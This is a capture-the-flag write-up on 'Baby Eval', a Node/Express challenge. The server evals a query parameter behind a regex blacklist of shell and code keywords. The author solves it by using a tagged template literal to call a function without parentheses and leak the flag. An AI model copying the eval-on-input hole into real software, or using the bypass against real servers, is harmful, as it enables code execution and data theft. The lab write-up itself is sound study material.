<h1>Baby Eval</h1>

<h2>The App</h2>

<p>Baby Eval is a Node app which has a path <code>/</code> which lists some information including the server source code. As seen in the code the information comes from the following function:</p>

<p>```javascript
function directory(keys) {
    const values = {
        "title": "View Source CTF",
        "description": "Powered by Node.js and Express.js",
        "flag": process.env.FLAG,
        "lyrics": "Good job, youâ€™ve made it to the bottom of the mind control facility. Well done.",
        "createdAt": "1970-01-01T00:00:00.000Z",
        "lastUpdate": "2022-02-22T22:22:22.222Z",
        "source": require('fs').readFileSync(__filename),
    };</p>

<pre><code>return "&lt;dl&gt;" + keys.map(key =&gt; `&lt;dt&gt;${key}&lt;/dt&gt;&lt;dd&gt;&lt;pre&gt;${escape(values[key])}&lt;/pre&gt;&lt;/dd&gt;`).join("") + "&lt;/dl&gt;";
</code></pre>

<p>}
```</p>

<p>The webpage is created here:
```javascript
const payload = req.query.payload;</p>

<p>if (payload &amp;&amp; typeof payload === "string") {
    const matches = /([.()'"[]{}&lt;&gt;_$%\xu^;=]|import|require|process|proto|constructor|app|express|req|res|env|process|fs|child|cat|spawn|fork|exec|file|return|this|toString)/gi.exec(payload);
    if (matches) {
        res.status(400).send(matches.map(i =&gt; <code>&lt;code&gt;${i}&lt;/code&gt;</code>).join("<br>"));
    } else {
        res.send(<code>${eval(payload)}</code>);
    }
} else {
    res.send(directory(["title", "description", "lastUpdate", "source"]));
}
```</p>

<h2>Tried solutions</h2>

<p>The goal was to get the flag. First I saw that the code can execute <code>eval</code> by entering a <code>payload</code> as the <code>GET</code> query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because <code>(</code> and <code>)</code> are not allowed. Then I googled for a way to call a function without prenthesis. Found
<code>javascript
alert`hello`
</code>
and remembered that JavaScript Template Literals can have tags which are basically functions which first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (<code>${x}</code>).</p>

<h2>Solution</h2>

<p><code>typescript
directory`flag`
</code></p>

<p><code>
?payload=directory`flag`
</code></p>

<p>Because we don't have an injection variable, the argument of <code>directory</code> is just <code>[ "flag" ]</code>.</p>
